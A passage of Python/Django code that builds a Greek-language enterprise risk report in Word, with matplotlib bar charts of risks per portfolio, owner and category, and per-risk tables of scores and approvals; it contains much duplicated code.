    portfolio_graph_html = generate_portfolio_graph_gr()  
    total_risks = Risk.objects.count()

    document.add_paragraph(
    "\nΑριθμός Κινδύνων ανά Χαρτοφυλάκιο: Τα χαρτοφυλάκια δημιουργήθηκαν βάσει του οργανογράμματος της εταιρείας, ευθυγραμμίζοντας τους κινδύνους με "
    "τα διάφορα τμήματα και μονάδες εντός του οργανισμού."
    )

    document.add_paragraph(
        "Αυτή η δομή επιτρέπει μια πιο λεπτομερή ανάλυση των κινδύνων, διασφαλίζοντας ότι κάθε χαρτοφυλάκιο αντικατοπτρίζει το μοναδικό περιβάλλον κινδύνου "
        "που σχετίζεται με τις αντίστοιχες επιχειρησιακές λειτουργίες του."
    )

    document.add_paragraph(
        "Επιπλέον, τα χαρτοφυλάκια περιλαμβάνουν συγκεκριμένα έργα (projects), τα οποία συμβάλλουν στην ανάδειξη των κινδύνων που ενδέχεται να επηρεάσουν την επιτυχή υλοποίηση "
        "και επίτευξη των στόχων κάθε έργου."
    )

    document.add_paragraph(
        "Μέσα από αυτή την ανάλυση, είναι δυνατός ο εντοπισμός των κινδύνων σε επίπεδο έργων και η λήψη κατάλληλων μέτρων μετριασμού, ώστε να διασφαλιστεί η αποτελεσματική "
        "λειτουργία των έργων και των επιχειρησιακών διαδικασιών."
    )

    # Assuming total_risks is a sum of all risks across portfolios


    import re

    def clean_html_tags(text):
        return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

    import re

    import re

    def clean_html_tags(text):
        return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

    def add_portfolio_details(document, portfolios):
        # Filter out portfolios that contain 'archive' in their name (case-insensitive) and sort by name
        filtered_portfolios = sorted(
                [
                    portfolio for portfolio in portfolios
                    if not any(keyword in portfolio.name.lower() for keyword in ['archive', 'sub', 'set'])
                ],
                key=lambda portfolio: portfolio.name.lower()
        )

        # Add a table with two columns: Title (Χαρτοφυλάκιο) and Description
        table = document.add_table(rows=1, cols=2)
        table.style = 'Table Grid'  # You can choose any table style available in your document

        # Set up the header row
        hdr_cells = table.rows[0].cells
        hdr_cells[0].text = 'Χαρτοφυλάκιο (Title)'
        hdr_cells[1].text = 'Περιγραφή (Description)'

        # Add portfolio details as rows in the table
        for portfolio in filtered_portfolios:
            row_cells = table.add_row().cells
            row_cells[0].text = portfolio.name  # Portfolio title
            if portfolio.description:
                clean_description = clean_html_tags(portfolio.description)
                row_cells[1].text = clean_description  # Portfolio description
            else:
                row_cells[1].text = "Δεν υπάρχει περιγραφή."  # Default text if no description


    from django.db.models import Q

    portfolios = Portfolio.objects.exclude(
        Q(name__icontains='archive') | Q(name__icontains='sub') | Q(name__icontains='set')
    ).order_by('name')


    add_portfolio_details(document, portfolios)

# Insert the total_risks into the paragraph
    # First paragraph
    document.add_paragraph(
        "\nΗ παρακάτω ανάλυση παρουσιάζει τον αριθμό των κινδύνων ανά χαρτοφυλάκιο και τα αντίστοιχα επίπεδα υπολειμματικού (Residual) κινδύνου."
    )

    # New paragraph for total risks information
    # document.add_paragraph(
    #     f"Συνολικά, έχουν εντοπιστεί {total_risks} κίνδυνοι, οι οποίοι κατατάσσονται σε υψηλό (High), μεσαίο (Medium), και χαμηλό (Low) επίπεδο, "
    #     f"αναλόγως της σοβαρότητας μετά την εφαρμογή των μέτρων μετριασμού."
    # )

    
    
    document.add_page_break()
    
    from PIL import Image

    def rotate_image_bytes(image_bytes, degrees):
    # Open the image from bytes
        image = Image.open(io.BytesIO(image_bytes))
        # Rotate the image by the specified degrees
        rotated_image = image.rotate(degrees, expand=True)
        # Save the rotated image back into a BytesIO object
        rotated_image_io = io.BytesIO()
        rotated_image.save(rotated_image_io, format='PNG')
        rotated_image_io.seek(0)  # Reset the pointer to the start of the BytesIO object
        return rotated_image_io

    portfolio_graph_html = generate_portfolio_graph_gr()  

    image_data = base64.b64decode(portfolio_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))
  
    # Example: Number of risks per owner

    document.add_heading('\nΑριθμός Κινδύνων ανά Ρόλο Υπεύθυνου Κινδύνου (Risk Owner)', level=2)
    document.add_paragraph(
    "\nΚάθε αναγνωρισμένος κίνδυνος αποδίδεται σε έναν ή περισσότερους 'Υπεύθυνους Κινδύνου' (Risk Owners), οι οποίοι διαθέτουν την απαραίτητη τεχνογνωσία για να αξιολογήσουν "
    "τη σοβαρότητα του κινδύνου και να προτείνουν στρατηγικές μετριασμού."
    )

    document.add_paragraph(
        "Ο ρόλος των Υπεύθυνων Κινδύνου (Risk Owners) είναι κεντρικός, καθώς η ευθύνη τους εκτείνεται στη συνεχή παρακολούθηση "
        "της εξέλιξης του κινδύνου, τη λήψη αποφάσεων και την ενημέρωση των εμπλεκόμενων μερών."
    )

    document.add_paragraph(
        "Με τη χρήση της κεντρικής εφαρμογής διαχείρισης κινδύνων (ermapp.avax.gr), οι Υπεύθυνοι Κινδύνου (Risk Owners) καλούνται να επικαιροποιούν τα δεδομένα δύο φορές τον χρόνο, "
        "επιβεβαιώνοντας την καταλληλότητα των μέτρων που έχουν ληφθεί."
    )

    document.add_paragraph(
        "Παράλληλα, το τμήμα διαχείρισης κινδύνων διενεργεί ανεξάρτητες αξιολογήσεις δύο φορές τον χρόνο, με στόχο να διασφαλίσει ότι η προληπτική προσέγγιση "
        "παραμένει σύμφωνη με τις στρατηγικές προτεραιότητες του οργανισμού."
    )

    document.add_paragraph(
        "Όλες οι πληροφορίες σχετικά με τις εγκρίσεις, τις αξιολογήσεις και τις αλλαγές αποθηκεύονται με ακρίβεια στην κεντρική εφαρμογή διαχείρισης κινδύνων (ermapp.avax.gr), "
        "εξασφαλίζοντας πλήρη διαφάνεια και λογοδοσία στη διαχείριση των κινδύνων."
    )
    
  

    # New paragraph for total risks information
    # Add new paragraph for total risks information
    paragraph = document.add_paragraph(
        f"Η παρακάτω ανάλυση παρουσιάζει τον αριθμό των κινδύνων ανά Υπεύθυνο Κινδύνου (Risk Owner) και τα αντίστοιχα επίπεδα υπολειμματικού (Residual) κινδύνου."
    )

    # Emphasize the second part of the paragraph
    emphasized_text = (
        "Το σύνολο των κινδύνων ανά (Risk Owner) μπορεί να μην ταιριάζει με το συνολικό πλήθος κινδύνων, "
        "λόγω της ύπαρξης πολλαπλών Risk Owners."
    )
    paragraph.add_run(emphasized_text).bold = True  # Making the emphasized part bold

    # Optional: Adjust the font size or other styles
    for run in paragraph.runs:
        run.font.size = Pt(12)  # You can adjust the font size as needed




    owner_graph_html = generate_owner_graph_gr()  

    image_data = base64.b64decode(owner_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))
   

    document.add_paragraph('Κατηγορίες Κινδύνων:', style='Heading 3')

# General Risk Categories
    document.add_paragraph('Κατηγορίες Κινδύνων:', style='Heading 3')
    document.add_paragraph('Οικονομικοί: Κίνδυνοι που επηρεάζουν την οικονομική σταθερότητα, όπως μεταβολές κόστους ή καθυστερήσεις χρηματοδότησης.', style='List Bullet')
    document.add_paragraph('Λειτουργικοί: Κίνδυνοι από αδυναμίες στις εσωτερικές διαδικασίες, ανθρώπινα σφάλματα ή αστοχίες εξοπλισμού.', style='List Bullet')
    document.add_paragraph('Τεχνολογικοί: Απειλές από τεχνολογικές αστοχίες ή παραβιάσεις ασφάλειας δεδομένων.', style='List Bullet')
    document.add_paragraph('Νομικοί: Κίνδυνοι μη συμμόρφωσης με νομικές και κανονιστικές απαιτήσεις.', style='List Bullet')
    document.add_paragraph('Συμμόρφωσης: Κίνδυνοι από παραβίαση εσωτερικών πολιτικών ή ηθικών κανονισμών.', style='List Bullet')

 
    category_graph_html = generate_category_graph_gr()  
        # document.add_paragraph('Αριθμός Κινδύνων ανά Κατηγορία')
        # document.add_picture(io.BytesIO(base64.b64decode(category_graph_html.split(",")[1])), width=Inches(5))
        

        
    image_data = base64.b64decode(category_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))    


    document.add_paragraph(
        'Η γενική κατηγοριοποίηση κινδύνων είναι ουσιώδης για τη στρατηγική διαχείρισης της εταιρείας. \n\nΣε επίπεδο έργου, ωστόσο, απαιτείται εξειδίκευση σε κάθε κατηγορία, '
        'ώστε να αντιμετωπιστούν οι μοναδικές προκλήσεις κάθε έργου και να επιτευχθούν οι στόχοι εντός προϋπολογισμού και χρόνου.',
        style='BodyText'
    )


   
    # Project-Level Risk Analysis in Construction
    document.add_paragraph('Ανάλυση Κινδύνων για Κατασκευαστικά Έργα:', style='Heading 3')
    document.add_paragraph(
        'Σε μεγάλα κατασκευαστικά έργα, όπως διάτρηση με TBM ή ανάπτυξη σταθμού παραγωγής ενέργειας, η ανάλυση κινδύνων σε επίπεδο έργου είναι απαραίτητη για την προσαρμογή της στρατηγικής '
        'στην ιδιαίτερη φύση και τις απαιτήσεις κάθε έργου.\n\n Τα έργα διάτρησης σε πυκνοκατοικημένες περιοχές απαιτούν αυστηρά μέτρα ασφάλειας και συμμόρφωσης, ενώ μεγάλα έργα υποδομών '
        'όπως οι σταθμοί παραγωγής ενέργειας απαιτούν εξειδικευμένη διαχείριση προμηθειών και πολύπλοκο τεχνολογικό συντονισμό. Η προσαρμογή διαχείρισης κινδύνων ενισχύει την αποτελεσματική '
        'αντιμετώπιση και ολοκλήρωση εντός προϋπολογισμού και προθεσμιών.',
        style='BodyText'
    )

    category_graph_html = generate_category_graph_per_project_gr()  
        # document.add_paragraph('Αριθμός Κινδύνων ανά Κατηγορία')
        # document.add_picture(io.BytesIO(base64.b64decode(category_graph_html.split(",")[1])), width=Inches(5))
        

        
    image_data = base64.b64decode(category_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))    



   

    # Page break after the section
    document.add_page_break()



    
  



from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField



import matplotlib.pyplot as plt
from matplotlib.ticker import MaxNLocator
import io
import base64
import textwrap

def generate_bar_chart_with_risk_levels(labels, high_risks, medium_risks, low_risks, title, max_label_width=30):
    # Replace any None values in labels and risk level lists with defaults
    labels = ['Unknown' if label is None else label for label in labels]
    high_risks = [0 if value is None else value for value in high_risks]
    medium_risks = [0 if value is None else value for value in medium_risks]
    low_risks = [0 if value is None else value for value in low_risks]

    # Calculate the total risks for each label
    total_risks = [h + m + l for h, m, l in zip(high_risks, medium_risks, low_risks)]

    # Sort by total risks in ascending order
    sorted_data = sorted(zip(total_risks, labels, high_risks, medium_risks, low_risks), key=lambda x: x[0])
    total_risks, labels, high_risks, medium_risks, low_risks = zip(*sorted_data)

    # Wrap y-axis labels to a specified width
    wrapped_labels = [textwrap.fill(label, max_label_width) for label in labels]

    # Calculate overall total risks
    overall_total_risks = sum(total_risks)

    # Increase the figure size dynamically based on the number of labels
    bar_height = 0.7  # Height of each bar
    fig_height = len(labels) * bar_height + 2  # Add extra space for margins
    fig, ax = plt.subplots(figsize=(16, fig_height))

    # Create stacked bar chart segments
    bars_low = ax.barh(wrapped_labels, low_risks, height=bar_height, color='green', edgecolor='black', label='Low')
    bars_medium = ax.barh(wrapped_labels, medium_risks, left=low_risks, height=bar_height, color='orange', edgecolor='black', label='Medium')
    bars_high = ax.barh(wrapped_labels, high_risks, left=[l + m for l, m in zip(low_risks, medium_risks)],
                        height=bar_height, color='red', edgecolor='black', label='High')

    # Add risk numbers inside the bar segments
    for bar_low, bar_medium, bar_high, low, medium, high in zip(bars_low, bars_medium, bars_high, low_risks, medium_risks, high_risks):
        if low > 0:
            ax.text(bar_low.get_width() / 2, bar_low.get_y() + bar_low.get_height() / 2, f'{low}', 
                    va='center', ha='center', fontsize=16, color='white')
        if medium > 0:
            ax.text(bar_medium.get_width() / 2 + bar_medium.get_x(), bar_medium.get_y() + bar_medium.get_height() / 2, f'{medium}', 
                    va='center', ha='center', fontsize=16, color='black')
        if high > 0:
            ax.text(bar_high.get_width() / 2 + bar_high.get_x(), bar_high.get_y() + bar_high.get_height() / 2, f'{high}', 
                    va='center', ha='center', fontsize=16, color='white')

    # Add total risks at the end of each bar
    for bar, total in zip(bars_high, total_risks):
        width = bar.get_width() + (bar.get_x() if bar.get_x() > 0 else 0)
        ax.text(width + 1, bar.get_y() + bar.get_height() / 2, f'{int(total)}', 
                va='center', ha='left', fontsize=16, color='black')

    # Set labels and title
    ax.set_xlabel('Number of Risks', fontsize=16)
    ax.set_title(f"{title}\n\nTotal Risks: {overall_total_risks}", fontsize=16, fontweight='bold')

    # Customize y-axis label font size and padding
    ax.tick_params(axis='y', labelsize=16, pad=10)  # Adjust padding between labels and bars

    # Create custom legend
    ax.legend(loc='upper right', fontsize=16)

    # Force x-axis (number of risks) to use whole numbers
    ax.xaxis.set_major_locator(MaxNLocator(integer=True))

    plt.tight_layout()

    # Save the plot to a BytesIO buffer
    buffer = io.BytesIO()
    plt.savefig(buffer, format='png')
    plt.close()
    buffer.seek(0)

    # Convert the buffer to a base64 image
    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
    return f"data:image/png;base64,{image_base64}"



from django.db.models import Q
# Function to generate portfolio graph
from django.db.models import Q, F, ExpressionWrapper, IntegerField

from django.db.models import Q, F, Count, IntegerField, ExpressionWrapper

def generate_portfolio_graph_gr():
    # Annotate risks with the calculated residual score (residual_likelihood * residual_impact)
    portfolios = Risk.objects.exclude(
        Q(portfolio__name__icontains='archive') | 
        Q(portfolio__name__icontains='sub') | 
        Q(portfolio__name__icontains='set')
    ).annotate(
        residual_score=ExpressionWrapper(
            F('residual_likelihood') * F('residual_impact'),
            output_field=IntegerField()
        )
    ).values('portfolio__name').annotate(
        total=Count('id'),
        high=Count('id', filter=Q(residual_score__gte=15)),
        medium=Count('id', filter=Q(residual_score__gte=7, residual_score__lt=15)),
        low=Count('id', filter=Q(residual_score__lt=7))
    ).order_by('-portfolio__name')

    # Prepare data for the bar chart
    labels = [p['portfolio__name'] for p in portfolios]
    high_risks = [p['high'] for p in portfolios]
    medium_risks = [p['medium'] for p in portfolios]
    low_risks = [p['low'] for p in portfolios]

    # Generate the bar chart with risk levels
    return generate_bar_chart_with_risk_levels(
        labels, 
        high_risks, 
        medium_risks, 
        low_risks, 
        'Number of Risk Per Portfolio and Residual Risk Levels'
    )





from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

def generate_owner_graph_gr():
    # Annotate risks with the calculated residual score (residual_likelihood * residual_impact)
    owners = Risk.objects.exclude(
        Q(portfolio__name__icontains='archive') | 
        Q(portfolio__name__icontains='sub') | 
        Q(portfolio__name__icontains='set')
    ).annotate(
        residual_score=ExpressionWrapper(
            F('residual_likelihood') * F('residual_impact'),
            output_field=IntegerField()
        )
    ).values('owners__role').annotate(
        total=Count('id'),
        high=Count('id', filter=Q(residual_score__gte=15)),
        medium=Count('id', filter=Q(residual_score__gte=7, residual_score__lt=15)),
        low=Count('id', filter=Q(residual_score__lt=7))
    ).order_by('owners__role')

    # Prepare data for the bar chart
    labels = [o['owners__role'] for o in owners]
    high_risks = [o['high'] for o in owners]
    medium_risks = [o['medium'] for o in owners]
    low_risks = [o['low'] for o in owners]

    # Generate the new stacked bar chart with risk levels.
    return generate_bar_chart_with_risk_levels(
        labels, 
        high_risks, 
        medium_risks, 
        low_risks, 
        'Number of Risk per Risk Owner and Residual Risk Levels'
    )


# Function to generate category graph
from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

from django.db.models import Q, Count, F, IntegerField, ExpressionWrapper

from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

def generate_category_graph_gr():
    # Filter portfolios that should be excluded based on their names
    excluded_portfolios = Portfolio.objects.exclude(
        Q(name__icontains='archive') |
        Q(name__icontains='sub') |
        Q(name__icontains='project') |
        Q(name__icontains='set')
    )
    
    # Annotate categories with the calculated residual score for associated risks
    categories = Category.objects.filter(
        risk__portfolio__in=excluded_portfolios  # Ensure risks belong to included portfolios
    ).annotate(
        residual_score=ExpressionWrapper(
            F('risk__residual_likelihood') * F('risk__residual_impact'),
            output_field=IntegerField()
        )
    ).values('name').annotate(
        total=Count('risk'),
        high=Count('risk', filter=Q(residual_score__gte=15)),
        medium=Count('risk', filter=Q(residual_score__gte=7, residual_score__lt=15)),
        low=Count('risk', filter=Q(residual_score__lt=7))
    ).order_by('name')

    # Prepare data for the bar chart
    labels = [c['name'] for c in categories]
    high_risks = [c['high'] for c in categories]
    medium_risks = [c['medium'] for c in categories]
    low_risks = [c['low'] for c in categories]

    # Generate the new stacked bar chart with risk levels.
    return generate_bar_chart_with_risk_levels(
        labels, 
        high_risks, 
        medium_risks, 
        low_risks, 
        'Number of Risk per Category and Residual Risk Levels (Enterprise Level)'
    )

from django.db.models import Q, F, Count, ExpressionWrapper, IntegerField

def generate_category_graph_per_project_gr():
    # Filter portfolios to include only those with "project" in their name and exclude others
    included_portfolios = Portfolio.objects.filter(
        name__icontains='project'  # Only portfolios containing "project" in their name
    ).exclude(
        Q(name__icontains='archive') |
        Q(name__icontains='sub') |
        Q(name__icontains='set')
    )
    
    # Annotate categories with the calculated residual score for associated risks
    categories = Category.objects.filter(
        risk__portfolio__in=included_portfolios  # Ensure risks belong to included portfolios
    ).annotate(
        residual_score=ExpressionWrapper(
            F('risk__residual_likelihood') * F('risk__residual_impact'),
            output_field=IntegerField()
        )
    ).values('name').annotate(
        total=Count('risk'),
        high=Count('risk', filter=Q(residual_score__gte=15)),
        medium=Count('risk', filter=Q(residual_score__gte=7, residual_score__lt=15)),
        low=Count('risk', filter=Q(residual_score__lt=7))
    ).order_by('name')

    # Prepare data for the bar chart
    labels = [c['name'] for c in categories]
    high_risks = [c['high'] for c in categories]
    medium_risks = [c['medium'] for c in categories]
    low_risks = [c['low'] for c in categories]

    # Generate the new stacked bar chart with risk levels.
    return generate_bar_chart_with_risk_levels(
        labels, 
        high_risks, 
        medium_risks, 
        low_risks, 
        'Number of Risk per Category and Residual Risk Levels (Project Portfolios)'
    )


# Function to convert hex to RGB
def hex_to_rgb_gr(hex_color):
    hex_color = hex_color.lstrip('#')  # Remove the # symbol if present
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))  # Convert hex to RGB

# Function to format the risk score calculation and severity in the correct color
def format_risk_score_gr(run, likelihood, impact, score, severity_label, severity_color):
    run.add_text(f'Likelihood ({likelihood}) x Impact ({impact}) = {score} ({severity_label})')
    run.font.color.rgb = RGBColor(*hex_to_rgb(severity_color))

# Function to add a second TOC-like list for portfolios
def add_portfolio_toc_gr(document):
    document.add_heading('Portfolios Included in the Report', level=1)
    document.add_paragraph(
        'Below is a list of portfolios included in this risk management report, each representing '
        'different departments or functional areas within the organization.'
    )

    from django.db.models import Q

    portfolios = Portfolio.objects.exclude(
        Q(name__icontains='archive') | Q(name__icontains='sub') | Q(name__icontains='set')
    )




    for portfolio in portfolios:
        document.add_paragraph(f'{portfolio.name}', style='List Bullet')

# Updated Function to add "Risks by Portfolio" section
from docx.shared import Pt
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import RGBColor
from docx.oxml import parse_xml


# Helper function to set background color for table cell
from docx.shared import RGBColor

from bs4 import BeautifulSoup
from docx.shared import RGBColor
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls

from bs4 import BeautifulSoup
from docx.shared import RGBColor
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls

from bs4 import BeautifulSoup
from docx.shared import RGBColor
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls

def set_cell_background_color_gr(cell, color):
    """
    Sets the background color of a given table cell.
    """
    cell._element.get_or_add_tcPr().append(
        parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}"/>')
    )

from docx import Document
from docx.shared import Pt, RGBColor
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from django.utils import timezone
import re



def apply_score_color(cell, score):
    """Applies color based on score value (low: green, moderate: orange, high: red)."""
    if score < 5:
        color = '00FF00'  # Green
    elif 5 <= score < 15:
        color = 'FFFF00'  # orange
    else:
        color = 'FF0000'  # Red

    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)

from docx import Document
from docx.shared import Pt, RGBColor
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from django.utils import timezone
import re


def apply_score_color(cell, score):
    if score < 5:
        color = '00FF00'
    elif 5 <= score < 15:
        color = 'FFFF00'
    else:
        color = 'FF0000'

    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)
    
    # Ensure font color is black for visibility
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.font.color.rgb = RGBColor(0, 0, 0)

from docx import Document
from docx.shared import Pt, RGBColor
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from django.utils import timezone
import re
 
from bs4 import BeautifulSoup
from html import unescape
from docx.shared import Pt

from html import unescape
import re
from docx.shared import Pt
from docx.enum.text import WD_ALIGN_PARAGRAPH

from html import unescape
import re
from docx.shared import Pt
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from docx.oxml import OxmlElement
from docx.oxml.ns import qn


def apply_score_color(cell, score):
    if score < 5:
        color = '00FF00'
    elif 5 <= score < 15:
        color = 'FFFF00'
    else:
        color = 'FF0000'

    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)
    
    for paragraph in cell.paragraphs:
        for run in paragraph.runs:
            run.font.color.rgb = RGBColor(0, 0, 0)

from html import unescape
import re
from docx.shared import Pt
from docx.oxml import OxmlElement
from docx.oxml.ns import qn


def add_hyperlink(paragraph, url, text, bold=False, italic=False):
    """
    Add a hyperlink to a Word paragraph.
    """
    # Create the hyperlink tag with the relationship ID
    part = paragraph.part
    r_id = part.relate_to(
        url, "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink", is_external=True
    )

    # Create the hyperlink element
    hyperlink = OxmlElement("w:hyperlink")
    hyperlink.set(qn("r:id"), r_id)

    # Create a run for the text inside the hyperlink
    run = OxmlElement("w:r")
    rPr = OxmlElement("w:rPr")

    # Add styling
    if bold:
        b = OxmlElement("w:b")
        rPr.append(b)
    if italic:
        i = OxmlElement("w:i")
        rPr.append(i)

    run.append(rPr)
    t = OxmlElement("w:t")
    t.text = text
    run.append(t)
    hyperlink.append(run)

    # Add the hyperlink to the paragraph
    paragraph._p.append(hyperlink)
    return hyperlink


from html import unescape
import re
from docx.shared import Pt

from html import unescape
import re
from docx.shared import Pt

from html import unescape
import re
from docx.shared import Pt

from html import unescape
import re
from docx.shared import Pt

import re
from html import unescape
from bs4 import BeautifulSoup
from docx.shared import Pt




from io import BytesIO
from docx import Document
from html2docx import html2docx

from io import BytesIO
from docx import Document
from html2docx import html2docx

def add_html_to_word(document, cell_paragraph, html_content):
    """
    Converts HTML content (including tables, lists, inline formatting, etc.)
    into DOCX content using html2docx, then copies its paragraphs and nested tables 
    into the table cell containing cell_paragraph.
    
    Note: The 'cell_paragraph' is expected to be the first paragraph in the target cell.
    """
    # Convert HTML to DOCX bytes using html2docx (requires a title argument).
    docx_result = html2docx(html_content, title="Converted Content")
    
    # Wrap the result in a BytesIO stream if needed.
    if not isinstance(docx_result, BytesIO):
        temp_stream = BytesIO(docx_result)
    else:
        temp_stream = docx_result

    # Open the temporary DOCX.
    temp_doc = Document(temp_stream)
    
    # Get the table cell from the provided paragraph.
    cell = cell_paragraph._parent  # In python-docx, the parent of a Paragraph is its Cell.
    
    # Clear the content of the provided paragraph.
    cell_paragraph.text = ""
    
    # Append all paragraphs from the temporary document into the cell.
    for para in temp_doc.paragraphs:
        new_para = cell.add_paragraph(para.text)
        # new_para.style = para.style  # Optionally, copy the style.
    
    # Append all tables from the temporary document into the cell as nested tables.
    for table in temp_doc.tables:
        num_cols = len(table.columns)
        nested_table = cell.add_table(rows=0, cols=num_cols)
        nested_table.style = table.style
        for row in table.rows:
            new_row = nested_table.add_row().cells
            for i, temp_cell in enumerate(row.cells):
                new_row[i].text = temp_cell.text





from bs4 import BeautifulSoup

def clean_html_tags(html_content):
    """
    Cleans HTML tags and returns plain text while preserving the structure.
    Converts lists and paragraphs into readable plain text.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    cleaned_text = []

    for element in soup.descendants:
        if element.name == 'br':
            # Line break
            cleaned_text.append("\n")
        elif element.name == 'ul' or element.name == 'ol':
            # Handle lists
            for idx, li in enumerate(element.find_all('li'), start=1 if element.name == 'ol' else None):
                if idx is not None:
                    cleaned_text.append(f"{idx}. {li.get_text().strip()}")
                else:
                    cleaned_text.append(f"• {li.get_text().strip()}")
        elif element.name == 'p':
            # Add paragraph text
            cleaned_text.append(f"{element.get_text().strip()}\n")
        elif isinstance(element, str):
            # Plain text
            cleaned_text.append(element.strip())

    return "\n".join(cleaned_text).strip()


def add_risks_by_portfolio_gr(document):
    """
    Adds risks by portfolio to the Word document in Annex 1 format.
    """
    # Start a new page and add a section title for the "Risks by Portfolio"
    document.add_page_break()
    document.add_heading('\nΠαράρτημα 1: Αναλυτική Έκθεση Κινδύνου ανά Χαρτοφυλάκιο', level=1)

    portfolios = Portfolio.objects.exclude(
        name__icontains='archive'
    ).exclude(
        name__icontains='sub'
    ).exclude(
        name__icontains='set'
    ).order_by('name')

    for portfolio in portfolios:
        # Start a new page for each portfolio
        document.add_page_break()

        # Add the portfolio title with Heading 2
        document.add_paragraph(f'Χαρτοφυλάκιο: {portfolio.name}', style='Heading 2')

        # Add the portfolio description with cleaned HTML content
        if portfolio.description:
            cleaned_description = clean_html_tags(portfolio.description)
            document.add_paragraph(cleaned_description)

        # Fetch the risks for each portfolio
        risks = Risk.objects.filter(portfolio=portfolio)

        for risk in risks:
            # Create a table to hold all the content
            table = document.add_table(rows=0, cols=3)  # Use 3 columns for the rows where it makes sense

            # Line 1: Risk Title (spanning all columns in one row)
            title_row = table.add_row().cells
            title_row[0].merge(title_row[1]).merge(title_row[2])  # Merge the 3 columns
            title_row[0].paragraphs[0].add_run(f'Risk: {risk.title}').bold = True

            # Line 2: Risk Description (spanning all columns in one row, with cleaned HTML content)
            description_row = table.add_row().cells
            description_row[0].merge(description_row[1]).merge(description_row[2])  # Merge the 3 columns
            cleaned_description = clean_html_tags(risk.description)
            description_row[0].paragraphs[0].add_run(f'Description: {cleaned_description}')

            # Line 3: Inherent, Residual, and Targeted Scores (each score in a separate cell)
            score_row = table.add_row().cells
            score_row[0].paragraphs[0].add_run('Inherent:').bold = True
            format_risk_score(
                score_row[0].paragraphs[0].add_run(),
                risk.inherent_likelihood,
                risk.inherent_impact,
                risk.inherent_score(),
                risk.inherent_traffic_light()[0],
                risk.inherent_traffic_light()[1]
            )

            score_row[1].paragraphs[0].add_run('Residual:').bold = True
            format_risk_score(
                score_row[1].paragraphs[0].add_run(),
                risk.residual_likelihood,
                risk.residual_impact,
                risk.residual_score(),
                risk.residual_traffic_light()[0],
                risk.residual_traffic_light()[1]
            )

            score_row[2].paragraphs[0].add_run('Targeted:').bold = True
            format_risk_score(
                score_row[2].paragraphs[0].add_run(),
                risk.targeted_likelihood,
                risk.targeted_impact,
                risk.targeted_score(),
                risk.targeted_traffic_light()[0],
                risk.targeted_traffic_light()[1]
            )



            # Line 4: Category, Last Assessed Date, and Last Approved Date (each in a separate cell)
            info_row = table.add_row().cells

            # Category
            category_run = info_row[0].paragraphs[0].add_run('Category: ')
            category_run.bold = True
            if risk.category:
                info_row[0].paragraphs[0].add_run(risk.category.name)
            else:
                info_row[0].paragraphs[0].add_run("N/A")

            # Last Assessed Date
            last_assessed_run = info_row[1].paragraphs[0].add_run('Last Assessed Date: ')
            last_assessed_run.bold = True
            if risk.last_assessed_date:
                last_assessed = risk.last_assessed_date.strftime('%d/%m/%Y')
                last_assessed_run = info_row[1].paragraphs[0].add_run(last_assessed)
            else:
                last_assessed_run = info_row[1].paragraphs[0].add_run("N/A")
                last_assessed_run.font.color.rgb = RGBColor(255, 0, 0)  # Red if no date available

            # Owners and Last Approval Dates
            owners_cell = info_row[2]
            owners_cell.paragraphs[0].add_run('Owners & Last Approval Date:').bold = True

            for owner in risk.owners.all():
                latest_approval = risk.approval_requests.filter(user=owner, status='approved').order_by('-response_date').first()

                # Only display the role, not the username
                owner_run = owners_cell.add_paragraph().add_run(f"{owner.role} - ")

                if latest_approval and latest_approval.response_date:
                    # Calculate approval cycle
                    cycle_timedelta = risk.get_approval_cycle_timedelta()

                    # Check if the last approval is within the approval cycle
                    last_approval_date = latest_approval.response_date
                    approval_due_threshold = last_approval_date + cycle_timedelta
                    current_date = timezone.now()

                    # Check if approval is overdue
                    if current_date > approval_due_threshold:
                        color = RGBColor(255, 0, 0)  # Red if overdue
                    else:
                        color = RGBColor(0, 128, 0)  # Green if within the cycle

                    owner_run.font.color.rgb = color
                    owners_cell.paragraphs[-1].add_run(last_approval_date.strftime('%d/%m/%Y'))
                else:
                    owner_run.font.color.rgb = RGBColor(255, 0, 0)  # Red if no approval exists
                    owners_cell.paragraphs[-1].add_run("N/A")

            # Add sections for Mitigations, Actions, Indicators, Events, and Procedures
